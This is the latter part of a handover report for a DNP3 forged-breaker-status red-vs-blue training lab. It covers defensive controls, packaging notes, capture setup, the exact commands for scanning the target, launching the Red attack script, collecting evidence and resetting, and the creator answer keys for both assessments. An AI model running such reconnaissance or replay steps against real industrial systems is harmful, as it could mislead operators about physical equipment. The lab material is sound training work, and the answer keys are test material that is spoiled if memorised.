- Restrict DNP3 master and replay/test interfaces to explicit allow-listed management networks.

- Remove or disable replay-ingress functions outside authorized training environments.

- Use network segmentation and industrial firewalls between operator, engineering and field-control zones.

- Apply DNP3 Secure Authentication where supported by the deployed master and outstation stack.

- Monitor for new or unexpected DNP3 source hosts, source ports and repeated event payloads.

- Detect connections to engineering/test ports such as TCP/20003 from participant or corporate segments.

## 14.2 Process-integrity controls

- Keep an independent source of physical truth that is not derived from the same reporting path as the HMI.

- Alert whenever the operator display differs from position sensors or other independent process sources.

- Require confirmation from multiple sources before high-impact switching decisions.

- Display data provenance and freshness so operators can distinguish master-reported values from local sensor truth.

- Use sequence, timing and duplicate-payload analytics to identify replayed reporting events.

## 14.3 Logging and incident readiness

- Preserve replay-ingress acceptance/rejection records, proxy transitions, master observations and mismatch events.

- Synchronise time across OT components to support timeline correlation.

- Protect packet captures and JSONL logs with access controls and SHA-256 manifests.

- Practice evidence-first containment so reset actions do not erase the incident trail.

- Maintain INREP/SITREP procedures for false-data and manipulation-of-view incidents.

# 15. Known Limitations and Operational Notes

**Table 20. Implementation and packaging notes**

| **Observation** | **Meaning / recommended action** |
|----|----|
| Training-only replay ingress | TCP/20003 intentionally provides a controlled attack surface. It must not be treated as a production design pattern. |
| Upstream NAT attribution | The target recorded source 172.24.4.1. Full attribution may require upstream NAT, hypervisor or gateway logs. |
| Wireshark malformed labels | Some internal TCP/20000 reassembled packets are labelled malformed by Wireshark. Use native logs, functional probes and byte evidence for authoritative validation. |
| Participant HMI hides truth | This is intentional to prevent spoilers. Blue analysts must use privileged runtime and evidence sources. |
| Executable permission preservation | Some extraction methods do not retain Unix execute bits. Preserve modes in final packaging or use bash-based invocation. |
| Empty package directories | Standalone Reports/ and RvB ttps/ may be removed or populated for cleaner handover packaging. |
| Static forged payload | The package uses a validated fixed 123-byte exercise event. This supports repeatability but should not be mistaken for broad DNP3 fuzzing coverage. |
| No physical device | The physical truth is an independent software simulator, not an energized field breaker. The protocol, master/outstations, network behavior and evidence are real; the physical consequence is safely simulated. |

## 15.1 Wireshark SSHdump troubleshooting record

- After the test VM was rebuilt, the Windows SSH host key and capture public key had to be re-authorized.

- The new ED25519 fingerprint was verified directly on the VM before replacing the obsolete known_hosts entry.

- The remote capture interface was ens3, not eth0.

- The ubuntu account was validated for passwordless key login and sudo -n tcpdump execution.

- Capture and display filters are separate: the capture filter limits remote tcpdump; the display filter controls Wireshark presentation.


**Resolved remote capture configuration**


Server 203.0.0.161, user ubuntu, private key wireshark-sshdump-rsa, interface ens3, privilege sudo, capture filter tcp port 20003 or tcp port 20000.


# 16. Final Handover Checklist

**Table 21. Boss-handover readiness**

| **Item** | **Status** | **Handover action** |
|----|----|----|
| Original source package hash | Verified | Retain SHA-256 b82cc90b... as source identifier. |
| Complete technical/non-technical report | Complete | Include this DOCX outside all three module directories. |
| Evidence archive | Verified externally | SHA-256 record included; send the verified tar.gz separately. |
| Wireshark screenshots | Included | Three packet-analysis PNGs included. |
| PCAP/PCAPNG | Included | Live SSHdump PCAPNG included. |
| Script execute permissions | Complete | Executable modes preserved. |
| Empty directories | Complete | Unused empty directories removed. |
| SHA256SUMS | Complete | Root manifest regenerated. |
| Fresh extraction test | PASS | Clean extraction and module verification passed. |
| Final runtime re-test | Previously validated | Runtime content is unchanged; the prior full lifecycle passed. |


Final conclusion

Runtime and evidence validation passed. Final packaging is complete: executable modes are preserved, unused empty directories are removed, the revised report and Wireshark evidence are included, checksums are regenerated, and clean fresh-extraction verification passed. Send the separately verified evidence tar.gz alongside this ZIP when required.


# Appendix A. Exact Validated Commands

## A.1 Install and verify


cd DNP3-Forged-Breaker-Status-Red-vs-Blue-Module

chmod +x *.sh Challenge-Core/*.sh Challenge-Core/scripts/*.sh

sudo ./setup.sh

sudo ./service-availability.sh


## A.2 External baseline


TARGET=203.0.0.161

nmap -Pn -sT -p 8088,20000,20003 "$TARGET"

curl -fsS "http://$TARGET:8088/api/status" | jq .


## A.3 Authorized Red action


bash ./Red-Team-Attack.sh "$TARGET"

# or use the manual Python replay shown in Section 7.4


## A.4 Blue evidence


sudo ./collect-evidence.sh

sudo jq . /opt/ot-challenges/dnp3-forged-breaker-status/runtime/truth-state.json

sudo jq . /opt/ot-challenges/dnp3-forged-breaker-status/runtime/master-status.json

sudo jq . /opt/ot-challenges/dnp3-forged-breaker-status/runtime/proxy-mode.json

sudo tail -n 20 /var/log/otlab/dnp3-forged-breaker-status/replay-ingress.jsonl | jq -c .

sudo tail -n 20 /var/log/otlab/dnp3-forged-breaker-status/mismatch-alerts.jsonl | jq -c .


## A.5 Recovery


sudo ./reset.sh

sudo /opt/ot-challenges/dnp3-forged-breaker-status/scripts/validate-runtime.sh

sudo ./service-availability.sh

curl -fsS http://127.0.0.1:8088/api/status | jq .


## A.6 Evidence archive transfer verification


REMOTE_SHA=$(ssh ubuntu@203.0.0.161 "sha256sum '<remote-archive>' | awk '{print \$1}'")

LOCAL_SHA=$(sha256sum '<local-archive>' | awk '{print $1}')

[ "$REMOTE_SHA" = "$LOCAL_SHA" ] && echo DNP3_EVIDENCE_TRANSFER_INTEGRITY=PASS


# Appendix B. Evidence and File Inventory

## B.1 Core evidence files

**Table 22. Evidence inventory**

| **File** | **Purpose** |
|----|----|
| truth.jsonl | Independent physical breaker truth history. |
| outstation.jsonl | Legitimate outstation activity. |
| forged-outstation.jsonl | Forged outstation activity. |
| proxy.jsonl | Backend selection and proxy transitions. |
| replay-ingress.jsonl | Replay source, validation, payload details and acceptance/rejection. |
| master.jsonl | Master observations and reported state. |
| mismatch-alerts.jsonl | Truth-to-master contradiction alerts. |
| dnp3-traffic.pcap\* | Rotating network packet capture. |
| truth-state.json | Current authoritative truth snapshot. |
| master-status.json | Current master observation and mismatch state. |
| proxy-mode.json | Current legitimate/forged backend selection. |

## B.2 Module-level documents

**Table 23. Module documentation inventory**

| **Document** | **Purpose** |
|----|----|
| Description.md | Non-spoiling role-specific scenario. |
| Red-Writeup.md | Detailed Red discovery and authorized attack steps. |
| Blue-Writeup.md | Detection, evidence, investigation, recovery and reporting guide. |
| Assessment\*.xlsx | Three MCQs, two fill-in-the-blank questions and creator answer key. |
| Setup-TTP.yml / ttps/setup.yml | Setup confirmation logic. |
| Attack-TTP.yml / ttps/attack.yml | Authorized incident generation. |
| Service-Availability-TTP.yml | Three-vector availability check linked to RvB setup. |
| INREP.md | Initial incident report template. |
| SITREP.md | Situation report template. |
| RED-REPORT.md | Red exercise report template. |
| SHA256SUMS | Package integrity manifest. |

# Appendix C. Assessment Answer Summary

## C.1 Red Team creator answer key

**Table 24. Red assessment answers**

| **Question** | **Correct answer** |
|----|----|
| Participant-facing industrial protocol on TCP/20000 | DNP3 |
| Forged event object variation | Group 2 Variation 2 |
| MITRE technique | T1692.002 Unauthorized Message: Reporting Message |
| HMI state after replay | CLOSED |
| Exact final acceptance marker | DNP3_REPLAY_ACCEPTED |

## C.2 Blue Team creator answer key

**Table 25. Blue assessment answers**

| **Question** | **Correct answer** |
|----|----|
| Independent physical evidence source | truth.jsonl |
| Strongest correlation | Truth OPEN while master reports CLOSED and mismatch alert is generated |
| MITRE technique | T1692.002 Unauthorized Message: Reporting Message |
| Forged event variation | Group 2 Variation 2 |
| Exact final contradiction | TRUTH:OPEN\|MASTER:CLOSED |


**Scoring rule**


Each assessment totals five marks, passes at four marks, and requires the final finding question to be correct.


# Appendix D. Glossary

**Table 26. Challenge terminology**

| **Term** | **Meaning in this challenge** |
|----|----|
| DNP3 | Distributed Network Protocol used between control masters and field outstations. |
| Master | The control-system component that polls the DNP3 reporting endpoint and updates the operator view. |
| Outstation | A DNP3 server representing field process data. |
| Binary Input | A reported two-state process value, used here for breaker OPEN/CLOSED status. |
| Group 2 Variation 2 | The validated DNP3 binary-input event object variation in the forged report. |
| Replay ingress | Controlled training service that accepts and validates the exercise replay frame. |
| Proxy mode | Selection of the legitimate or forged DNP3 backend. |
| Independent truth | Process state maintained outside the master/HMI reporting path. |
| Mismatch | A contradiction between independent truth and master-reported state. |
| HMI | Human-machine interface used by the operator to view the breaker state. |
| INREP | Initial Incident Report. |
| SITREP | Situation Report. |
| T1692.002 | MITRE ATT&CK for ICS technique Unauthorized Message: Reporting Message. |

## Source basis

This report was prepared from the supplied DNP3 challenge ZIP, module documentation, scripts, assessments, TTP definitions, manual validation console output, user-supplied Wireshark screenshots, and the verified evidence-archive SHA-256 record. No unverified runtime result has been presented as a pass.

**END OF REPORT**

